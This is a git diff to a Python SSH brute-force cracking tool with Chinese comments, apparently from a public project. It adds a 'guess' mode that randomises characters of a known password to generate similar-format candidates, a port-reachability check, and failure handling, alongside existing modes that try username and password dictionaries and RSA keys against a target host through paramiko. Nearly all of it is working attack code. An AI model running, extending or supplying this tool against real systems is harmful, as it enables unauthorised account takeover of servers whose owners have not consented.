@@ -5,6 +5,8 @@ import sys
 import smtplib
 import socket
 import argparse
+import random
+import string
 import os
 import configparser
 import datetime
@@ -40,18 +42,54 @@ print(fr"""
 
 # re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)
 
+# 写一个根据密码格式生成类似格式的密码
 
-def parseArgs() -> tuple[str, str , str, int , str , str, str]:
+def is_letter(s: str) -> bool:
+    return s.isalpha()
+
+def is_number(s: str) -> bool:
+    return s.isdigit()
+
+def is_special(s: str) -> bool:
+    return s in "!@#$%^&*()_+-="
+
+def is_upper(s: str) -> bool:
+    return s.isupper()
+
+def is_lower(s: str) -> bool:
+    return s.islower()
+
+def gress_password(old_password: str) -> str:
+    # SSH爆破中,用于猜测密码的函数
+    new_one = ''
+    for char in old_password:
+        if is_number(char):
+            new_one += str(random.randint(0, 9))
+        elif is_letter(char):
+            if is_upper(char):
+                new_one += random.choice(string.ascii_uppercase)
+            else:
+                new_one += random.choice(string.ascii_lowercase)
+        elif is_special(char):
+            new_one += random.choice("!@#$%^&*()_+-=")
+        else:
+            new_one += char
+        
+    return new_one
+
+
+def parseArgs() -> tuple[str, str , str, int , str , str, str, int]:
     parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
-    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login")
-    parser.add_argument('--stmpPath', type=str, default='data.conf', help="配置文件路径")
+    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login、rsa-login")
+    parser.add_argument('--stmpPath', type=str, default='data.conf', help="邮箱配置文件路径")
     parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
     parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
-    parser.add_argument('--username', type=str, default='root', help="目标主机用户名,如果你知道用户名，可以直接指定")
-    parser.add_argument('--password', type=str, default='root', help="目标主机密码,如果你知道密码，可以直接指定")
-    parser.add_argument('--Rsa_password', type=str, default=None, help="目标主机RSA私钥密码,同上所述")
+    parser.add_argument('--username', type=str, default='root', help="目标主机用户名,如果你知道用户名，可以直接指定 (模式指定: login, rsa-login) ")
+    parser.add_argument('--password', type=str, default='admin123456', help="目标主机密码,如果你知道密码，可以直接指定 (模式指定: login) ")
+    parser.add_argument('--rsa_password', type=str, default=None, help="目标主机RSA私钥密码,同上所述 (模式指定: login, rsa-login) ")
+    parser.add_argument('--guessNum', type=int, default=10, help="猜测次数, 默认为10次 (模式指定: guess) ")
     args = parser.parse_args()
-    return args.mode , args.stmpPath, args.hostname, args.port, args.username, args.password, args.Rsa_password
+    return args.mode , args.stmpPath, args.hostname, args.port, args.username, args.password, args.rsa_password , args.guessNum
 
 def getConfig(section: str, key: str, stmpPathConf: str) -> str:
     config = configparser.ConfigParser()
@@ -62,10 +100,22 @@ def Successed(username: str, password: str) -> None:
     print(f"[√]SSH连接成功! 账号: {username} 密码为：{password}")
     exit(0)
 
-def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> tuple[bool,str,str]:
+def Failed(reason: str) -> None:
+    print(f"[×]SSH连接失败! 原因: {reason}")
+    exit(1)
+
+def PingIsOpenConnect(hostname: str, SSHport: int) -> bool:
     try:
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        socket.setdefaulttimeout(1)
+        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((hostname, SSHport))
+        return True
+    except Exception:
+        return False
+
+def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> tuple[bool,str,str]:
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
         id_rsa_filePath = id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa'
         local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath, password=Rsa_password)
         ssh_client.connect(hostname, port=SSHport, username=username, pkey=local_key)
@@ -76,10 +126,10 @@ def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_fileP
         ssh_client.close()
 
 def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) -> tuple[bool,str,str]:
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         print(fr"[!]尝试账号: {username} 密码：{password}")
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh_client.connect(hostname, port=SSHport, username=username, password=password)
         return True , username, password
     except Exception:
@@ -89,6 +139,7 @@ def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) 
 
 def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> None:
     if TryRsaSSHConnection(hostname, SSHport, username, id_rsa_filePath, Rsa_password)[0] is True:
+        print(fr"[√]RSA-SSH登录成功! 账号: {username} 私钥密码为：{Rsa_password}")
         exit(0)
     else:
         print("[×]RSA-SSH登录失败")
@@ -100,6 +151,8 @@ def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str) -> No
         print("[×]SSH登录失败")
 
 def sshClientConnection(hostname:str, SSHport: int):
+    if PingIsOpenConnect(hostname, SSHport) is False:
+            Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
@@ -110,10 +163,12 @@ def sshClientConnection(hostname:str, SSHport: int):
                 Successed(username.strip(), password.strip())
             else:
                 continue
-    print("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。") # 由于succeed 函数会让程序退出，所以当所有登录尝试不成功的时候，这里就会被执行
+    Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。") # 由于succeed 函数会让程序退出，所以当所有登录尝试不成功的时候，这里就会被执行
     # 后面的同理
 
 def sshRsaConnection(hostname: str, SSHport: int):
+    if PingIsOpenConnect(hostname, SSHport) is False:
+            Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
             user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
@@ -127,18 +182,32 @@ def sshRsaConnection(hostname: str, SSHport: int):
                     Successed(username.strip(), Rsa_password.strip())
                     break
                 break
-        print("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
+        Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
     elif(flag1 == 'n'):
         for username in user_name:
             if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, None)[0] is True:
                 Successed(username.strip(), None)
                 break
             break
-        print("[x]所有的字典都尝试完毕，没有找到合适的账号。")
+        Failed("[x]所有的字典都尝试完毕，没有找到合适的账号。")
     else:
         print("您的输入有误！")
 
+def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password: str) -> None:
+    if PingIsOpenConnect(hostname, SSHport) is False:
+        Failed("目标主机未开启SSH服务")
+    for i in range(guessNum):
+        new_password = gress_password(password)
+        if TrySSHConnection(hostname, SSHport, username, new_password)[0] is True:
+            print(f"[√]猜测成功! 账号: {username} 密码为：{new_password}")
+            exit(0)
+        else:
+            continue
+    Failed("[x]所有的猜测都尝试完毕，没有找到合适的密码。")
+
 def transFile(hostname: str, SSHport: int):
+    if PingIsOpenConnect(hostname, SSHport) is False:
+        Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
@@ -233,11 +302,12 @@ if __name__ == '__main__':
         'trans': (transFile, send_msg),
         'login': (TrySSHLogin, send_msg),
         'rsa-login': (TryRsaSSHLogin, send_msg),
+        'guess': (sshGuess, send_msg),
         'default': (print)
     }
       # 其实这里我本来想用 match case 语法，但是match case语法在python3.10之后才支持，所以我就用字典来代替了, 提升向后兼容性
 
-    mode, stmpPath, hostname, SSHport, username, password, Rsa_password = parseArgs()
+    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum= parseArgs()
     print(f"[DEBUG] 模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}")
     if mode not in modeDict:
         modeDict['default'](f"模式{mode}不存在！")
@@ -250,12 +320,17 @@ if __name__ == '__main__':
             if mode in ['client', 'rsa', 'trans']:
                 print("[DEBUG] 5秒后开始爆破...")
                 time.sleep(5)
+                print("[DEBUG] 开始爆破")
                 modeDict[mode][0](hostname.strip(), SSHport)
             if mode == 'login':
                 modeDict[mode][0](hostname.strip(), SSHport, username.strip(), password.strip())
             if mode == 'rsa-login':
                 id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径:")
-                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), id_rsa_filePath.strip(), Rsa_password.strip())
+                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), id_rsa_filePath.strip(), rsa_password.strip())
+            if mode == 'guess':
+                old_password = input("请输入您要猜测的密码:")
+                guessusername = input("请输入您要猜测的用户名:")
+                modeDict[mode][0](hostname.strip(), SSHport, guessNum, guessusername.strip(), old_password.strip())
             if len(modeDict[mode]) > 1:
                 modeDict[mode][1](stmpPath.strip())
         except Exception as e:
